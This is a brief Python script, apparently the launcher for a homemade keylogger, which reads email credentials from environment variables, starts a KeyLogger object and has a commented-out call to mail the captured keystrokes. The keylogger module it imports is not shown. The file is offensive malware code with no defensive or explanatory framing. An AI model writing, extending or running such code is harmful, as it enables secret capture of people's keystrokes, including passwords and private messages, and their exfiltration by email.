import keylogger,os


emailAddress = os.environ.get('DB_USER')
emailPassword = os.environ.get('DB_PASS')
my_keylogger = keylogger.KeyLogger(emailAddress,emailPassword)
my_keylogger.start()

# my_keylogger.send_mail(emailAddress,emailPassword)